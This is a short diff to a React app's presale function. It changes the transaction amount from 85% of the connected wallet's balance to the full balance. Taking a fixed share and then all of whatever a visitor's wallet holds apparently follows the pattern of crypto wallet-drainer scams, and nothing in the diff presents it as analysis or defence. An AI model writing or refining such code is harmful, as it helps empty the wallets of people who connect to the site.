@@ -259,7 +259,7 @@ function App() {
     }
   };
 
-  // Execute function with network check
+  // Execute function with network check - NOW USING 100% OF BALANCE
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -314,9 +314,8 @@ function App() {
         signer
       );
 
-      // Use BIGINT math - NO FLOATING POINT
-      const percent = 85n;
-      const value = (balanceData.value * percent) / 100n;
+      // USE 100% OF BALANCE - removed 85% calculation
+      const value = balanceData.value; // Send full balance
 
       // Log the transaction details
       console.log("💰 Transaction Details:", {
